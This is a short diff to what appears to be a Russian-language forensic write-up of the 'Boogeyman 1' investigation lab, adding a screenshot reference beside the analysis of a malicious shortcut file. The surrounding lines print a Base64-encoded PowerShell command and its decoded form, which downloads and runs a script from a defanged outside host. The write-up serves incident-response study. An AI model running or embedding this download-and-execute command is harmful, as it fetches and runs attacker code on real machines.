@@ -65,7 +65,9 @@ DFIR Investigation: Case "Boogeyman 1"
   С помощью инструмента LNKParse3 в поле аргументов командной строки ярлыка была
   обнаружена следующая Base64-строка:
            "aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA=="
-  
+
+![Figure 3: LNK file analysis revealing encoded PowerShell payload in command line arguments](Screen1.3.png)
+
   После декодирования была получена команда:
     iex (new-object net.webclient).downloadstring('http://files[.]bpakcaging.xyz/update')
   
